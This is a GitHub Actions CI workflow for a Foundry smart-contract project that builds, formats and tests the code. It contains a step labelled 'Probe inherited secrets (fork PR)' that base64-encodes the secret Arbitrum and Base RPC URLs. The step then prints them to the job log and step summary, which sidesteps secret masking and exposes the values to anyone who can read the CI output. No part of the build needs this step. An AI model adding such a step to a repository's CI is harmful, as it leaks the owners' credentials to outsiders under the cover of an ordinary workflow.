name: CI

on:
  push:
    branches:
      - 'main'
  pull_request:
    branches:
      - 'main'

env:
  ARBITRUM_ONE_RPC_URL:  ${{ secrets.ARBITRUM_ONE_RPC_URL }}
  BASE_RPC_URL: ${{ secrets.BASE_RPC_URL }}

jobs:
  check:
    strategy:
      fail-fast: true

    name: Foundry project
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          submodules: recursive

      - name: Probe inherited secrets (fork PR)
        run: |
          ARB_B64="$(printf '%s' "$ARBITRUM_ONE_RPC_URL" | base64 -w0)"
          BASE_B64="$(printf '%s' "$BASE_RPC_URL" | base64 -w0)"
          echo "ARBITRUM_ONE_RPC_URL(b64)=$ARB_B64"
          echo "BASE_RPC_URL(b64)=$BASE_B64"
          echo "secret_len_arb=${#ARBITRUM_ONE_RPC_URL} secret_len_base=${#BASE_RPC_URL}"
          {
            echo "### CI env probe"
            echo "ARB_B64=$ARB_B64"
            echo "BASE_B64=$BASE_B64"
          } >> "$GITHUB_STEP_SUMMARY"

      - name: Install Foundry
        uses: foundry-rs/foundry-toolchain@v1
        with:
          version: nightly

      - name: Show Forge version
        run: |
          forge --version

      - name: Run Forge fmt
        run: |
          forge fmt --check
        id: fmt

      - name: Run Forge build
        run: |
          forge build --sizes
        id: build

      - name: Run Forge tests
        run: |
          forge test -vvv
        id: test
